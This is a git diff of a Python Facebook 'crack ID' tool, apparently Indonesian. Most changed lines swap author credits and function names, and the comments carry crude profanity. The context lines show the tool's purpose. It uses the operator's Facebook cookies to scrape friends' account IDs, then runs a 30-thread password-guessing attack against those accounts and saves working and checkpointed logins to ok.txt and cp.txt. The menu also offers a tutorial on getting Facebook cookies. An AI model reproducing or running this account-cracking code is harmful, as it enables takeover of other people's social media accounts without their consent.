@@ -1,6 +1,10 @@
-#Code by Revan
-#Created 14-Maret-2021
-#My facebook (https://www.facebook.com/1836274989)
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#Males gw encrypt Tod jika mau recode, recode aja
+#Tapi ngotak dikit jangan Lo jual belikan sc ini kontol
+#Code by YayanXD 
+#Created 05-07-2020
+#My facebook (https://www.facebook.com/KM39453)
 
 import os,sys,re,time,json,random,requests
 from bs4 import BeautifulSoup as parser
@@ -24,7 +28,7 @@ def kontol():
      ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
 \x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
 \x1b[1;94m────────────────────────────────────────────────────
-\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : YayanXD Recode: Revan
+\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : YayanXD
 \x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/nazareva
 \x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/1836274989
 \x1b[1;94m────────────────────────────────────────────────────""")
@@ -37,30 +41,30 @@ def jembut():
      ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
 \x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
 \x1b[1;94m────────────────────────────────────────────────────
-\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : YayanXD Recode: Revan
+\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : nazareva
 \x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Github   : https://github.com/nazareva
 \x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/1836274989
 \x1b[1;94m────────────────────────────────────────────────────""")
 
-def nazareva():
+def yayanxd():
     yayan=input("\n\033[00m\t   [\033[96m Press Enter To Return\033[97m ] ")
-    if nazareva == "": 
+    if yayan == "": 
        os.system("python BL4CK.py")
     else:
        sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91mGood Byee :')")
-def revan():
+def moch_yayan():
     time.sleep(0.1)
-    print("\033[97m [\033[96m01\033[97m] Start  Crack ID")
+    print("\033[97m [\033[96m01\033[97m] Start  Cr4ck ID")
     print("\033[97m [\033[96m02\033[97m] Tutor  How to Get Fb Cookies")
     print("\033[97m [\033[96m03\033[97m] Joined Grup Fb ❤️ RATU ERROR ❤️")
-    print("\033[97m [\033[96m04\033[97m] Joined Grup Fb ASEP")
+    print("\033[97m [\033[96m04\033[97m] Joined Grup Fb Viral")
     print("\033[97m [\033[96m05\033[97m] Update Tools")
     print("\033[97m [\033[91m00\033[97m] Exit")
     print("\x1b[1;94m────────────────────────────────────────────────────")
     time.sleep(0.1)
 
     yayan=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
-    if revan == "1" or revan =="01":
+    if yayan == "1" or yayan =="01":
          mbasic = 'https://mbasic.facebook.com{}'
          global die,check,result, count
          id = []
@@ -237,7 +241,7 @@ def revan():
                          aahh("\x1b[1;94m •••••••••• 100%")
                          os.system("rm -rf cookies")
                          print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Deleted Successfully!")
-                         nazareva()
+                         yayanxd()
                    elif memek == '1' or memek =='01':
                          url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                          username = getid(mbasic.format(url["href"]))
@@ -302,8 +306,8 @@ def revan():
                    ikeh_ikeh_kimochi()
                    jembut()
                    print('\n\x1b[1;96m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
-                   print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
-                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")       
+                   print('\x1b[1;95m     疊╔═╦═────••♽••────═╦═╗疊')
+                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••────═╩═╝疊\n",end="")       
                    expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
@@ -311,8 +315,8 @@ def revan():
                    ikeh_ikeh_kimochi()
                    jembut()
                    print('\n\x1b[1;92m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
-                   print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
-                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")
+                   print('\x1b[1;97m     疊╔═╦═────••♽••────═╦═╗疊')
+                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••────═╩═╝疊\n",end="")
                    print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
                    print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
                    with ThreadPoolExecutor(max_workers=30) as ex:
@@ -345,16 +349,16 @@ def revan():
          yayanxd()
     elif yayan == "3" or yayan =="03":
          os.system('xdg-open https://www.facebook.com/groups/1683226775285117')
-         nazareva()
-    elif revan == "4" or yayan =="04":
+         yayanxd()
+    elif yayan == "4" or yayan =="04":
          os.system('xdg-open https://www.facebook.com/groups/868734063220514')
-         nazareva()
-    elif revan == "5" or yayan =="05":
+         yayanxd()
+    elif yayan == "5" or yayan =="05":
          print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait While Updating The Tools \x1b[1;97m]\n")
          os.system("git pull")
          print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Successfully Updated!\n ")
-         nazareva()
-    elif revan == "0" or revan =="00":
+         yayanxd()
+    elif yayan == "0" or yayan =="00":
          aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
          os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
          exit()                   	
@@ -364,6 +368,6 @@ if __name__=="__main__":
      croot()
      ikeh_ikeh_kimochi()
      kontol()
-     revan()
-     nazareva()
+     moch_yayan()
+     yayanxd()
 
